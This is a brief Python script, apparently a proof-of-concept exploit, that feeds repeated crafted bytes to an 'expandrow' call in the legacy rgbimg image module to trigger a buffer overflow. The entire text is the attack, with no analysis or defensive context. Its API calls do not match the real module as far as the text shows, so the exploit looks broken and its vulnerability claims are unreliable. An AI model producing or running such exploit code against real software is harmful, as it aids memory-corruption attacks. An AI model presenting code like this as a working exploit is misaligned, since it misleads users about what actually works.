import rgbimg

# Create a malicious image file with crafted data
malicious_image = b'\x01\x02\x03\x04' * 1024  # crafted data to trigger buffer overflow

# Create an instance of the rgbimg module
img = rgbimg.rgbimg()

# Call the vulnerable function with the malicious image data
img.expandrow(malicious_image, 1024)  # vulnerable call